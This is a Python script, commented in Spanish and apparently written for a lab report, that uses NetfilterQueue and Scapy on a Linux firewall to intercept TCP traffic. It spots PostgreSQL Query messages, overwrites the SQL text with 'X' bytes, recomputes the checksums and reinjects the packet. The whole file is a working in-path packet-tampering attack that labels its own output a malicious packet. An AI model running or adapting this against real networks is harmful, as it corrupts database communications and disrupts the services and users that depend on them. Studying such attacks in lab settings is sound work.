#!/usr/bin/env python3
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw, bytes_hex
import sys

print("[*] Iniciando Proxy Activo Scapy + NFQUEUE en el Firewall...")
print("[*] Escuchando activamente en la cola de Netfilter 1...")

def procesar_paquete(pkt):
    # Conversión de la trama cruda de Netfilter a un objeto manipulable por Scapy
    scapy_pkt = IP(pkt.get_payload())
    
    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        payload = scapy_pkt[Raw].load
        
        # Identificación del identificador de mensaje Query 'Q' (0x51) en la Capa de Aplicación
        if len(payload) > 5 and chr(payload[0]) == 'Q':
            print(f"\\n[!] ¡CONSULTA DETECTADA EN CAPA DE APLICACIÓN!")
            print(f"    Estructura Original detectada: {scapy_pkt.summary()}")
            
            # Modificación quirúrgica: Sobreescritura del comando SQL manteniendo la longitud binaria intacta
            payload_corrupto = bytearray(payload)
            for i in range(5, len(payload_corrupto) - 1):
                payload_corrupto[i] = ord('X')
            
            # Reempaquetado correcto sobre la capa de aplicación de Scapy
            scapy_pkt[TCP].payload = Raw(load=bytes(payload_corrupto))
            
            # Anulación de checksums de control para forzar la regeneración en la tarjeta de red
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            # Despliegue de métricas en consola para evidencia del informe
            print("[+] PAQUETE MALICIOSO GENERADO:")
            print(f"    Payload Enviado en Hex: {bytes_hex(bytes(payload_corrupto))}")
            print(f"    Payload Texto Corrupto: {bytes(payload_corrupto)}")
            
            # Aplicación de cambios en los bytes reales y reyección al flujo del Kernel
            pkt.set_payload(bytes(scapy_pkt))
            pkt.accept()
            print("[+] Paquete modificado e inyectado con éxito.")
            return

    # Aceptar el paso transparente del tráfico ACK/SYN sin alteración para mitigar congelamientos del cliente
    pkt.accept()

# Enlace del Callback a la cola del Kernel Linux
nfqueue = NetfilterQueue()
nfqueue.bind(1, procesar_paquete)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\\n[*] Deteniendo Proxy de Red.")
    nfqueue.unbind()
